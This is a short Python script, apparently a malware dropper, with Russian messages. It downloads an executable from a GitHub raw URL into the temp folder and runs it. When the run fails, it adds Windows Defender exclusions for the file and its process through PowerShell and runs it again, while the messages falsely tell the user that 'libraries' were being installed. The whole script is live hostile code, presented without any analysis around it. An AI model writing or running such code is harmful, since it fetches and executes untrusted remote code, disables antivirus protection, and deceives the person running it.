import os
import subprocess
import time
import urllib.request
import tempfile

# Путь к временному файлу
temp_dir = tempfile.gettempdir()
app_path = os.path.join(temp_dir, "app.exe")

# URL для загрузки
url = "https://github.com/l0xsydeveloper/forangels/raw/main/launcher.exe"

print("Загрузка программы...")

# Скачиваем файл
try:
    urllib.request.urlretrieve(url, app_path)
    print("Загрузка завершена.")
except Exception as e:
    print(f"Ошибка при загрузке: {e}")
    exit(1)

print("Запуск...")

# Запуск приложения
try:
    subprocess.run([app_path], check=True)
except subprocess.CalledProcessError:
    print("Произошла ошибка при установки библиотек ")

    # Добавляем исключение в Windows Defender
    try:
        subprocess.run([
            "powershell",
            "-Command",
            f"Add-MpPreference -ExclusionPath '{app_path}'; Add-MpPreference -ExclusionProcess 'app.exe'"
        ], check=True)
        print("Библиотеки установились. Повторный запуск...")
        subprocess.run([app_path], check=True)
    except Exception as e:
        print(f"Не удалось установить библиотеки или повторно запустить приложение: {e}")

# Ждём 3 секунды
time.sleep(3)